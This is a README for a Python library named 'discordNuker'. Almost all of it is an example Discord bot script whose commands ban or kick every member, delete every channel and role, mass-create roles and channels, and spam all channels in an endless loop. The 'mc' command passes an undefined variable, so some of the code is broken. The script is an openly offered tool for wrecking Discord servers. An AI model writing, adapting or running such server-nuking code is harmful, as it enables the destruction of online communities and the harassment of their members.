# discordNuker-Version-10.0.2
A Nuke library for discord




# Example:
```python
import discord
import os
import sys
import threading
import time
import requests
import discordNuker
from discord.ext import commands

intents = discord.Intents.all()
bot = commands.Bot(command_prefix="v!", intents=intents)
token = input("> ")

@bot.event
async def on_ready():
    print("ready")

@bot.command()
async def banAll(ctx):
    guild = ctx.guild.id
    for member in ctx.guild.members:
        discordNuker.banAll(guild, member.id, token)
@bot.command()
async def dc(ctx):
    guild = ctx.guild.id
    for channel in list(ctx.guild.channels):
        discordNuker.deleteChannels(channel.id, token)
@bot.command()
async def dr(ctx):
    guild = ctx.guild.id
    for role in list(ctx.guild.roles):
        discordNuker.deleteRoles(guild, role.id, token)
@bot.command()
async def kickAl(ctx):
    guild = ctx.guild.id
    for member in ctx.guild.members:
        discordNuker.kickAll(guild, member.id, token)
@bot.command()
async def mr(ctx, amount:int, type, *, name):
    guild = ctx.guild.id
    discordNuker.createRole(guild, amount, name, token)
@bot.command()
async def mc(ctx, amount:int, *, name):
    guild = ctx.guild.id
    discordNuker.createChan(guild, amount, name, type, token)
@bot.command()
async def massping(ctx, amount:int, *, message):
    guild = ctx.guild.id
    for channel in list(ctx.guild.channels):
        while True:
            discordNuker.sendMeassges(channel.id, amount, message, token)

bot.run(token)
```
